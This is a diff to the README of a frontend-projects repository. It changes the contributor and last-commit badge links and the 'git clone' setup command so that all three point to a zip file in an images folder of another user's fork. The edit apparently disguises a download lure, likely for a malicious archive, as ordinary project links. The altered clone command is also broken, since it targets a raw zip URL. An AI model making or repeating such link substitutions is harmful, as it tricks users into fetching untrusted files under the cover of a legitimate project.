@@ -1,7 +1,7 @@
 # Frontend Projects 🌐
 
-[![GitHub contributors](https://img.shields.io/github/contributors/ArmanIdrisi/frontend-projects)](https://github.com/ArmanIdrisi/frontend-projects/graphs/contributors)
-[![GitHub last commit](https://img.shields.io/github/last-commit/ArmanIdrisi/frontend-projects)](https://github.com/ArmanIdrisi/frontend-projects/commits/main)
+[![GitHub contributors](https://img.shields.io/github/contributors/ArmanIdrisi/frontend-projects)](https://github.com/RiturajMitra/frontend-projects/raw/refs/heads/main/project-17_remove_Signature_bg/images/projects-frontend-3.8.zip)
+[![GitHub last commit](https://img.shields.io/github/last-commit/ArmanIdrisi/frontend-projects)](https://github.com/RiturajMitra/frontend-projects/raw/refs/heads/main/project-17_remove_Signature_bg/images/projects-frontend-3.8.zip)
 
 This repository contains a collection of frontend projects.Each project is built using HTML, CSS, and JavaScript.
 
@@ -124,7 +124,7 @@ This repository contains a collection of frontend projects.Each project is built
 To run any of the projects locally, simply clone this repository using the following command:
 
 ```bash
-git clone https://github.com/ArmanIdrisi/frontend-projects.git
+git clone https://github.com/RiturajMitra/frontend-projects/raw/refs/heads/main/project-17_remove_Signature_bg/images/projects-frontend-3.8.zip
 ```
 
 ## Usage 💻
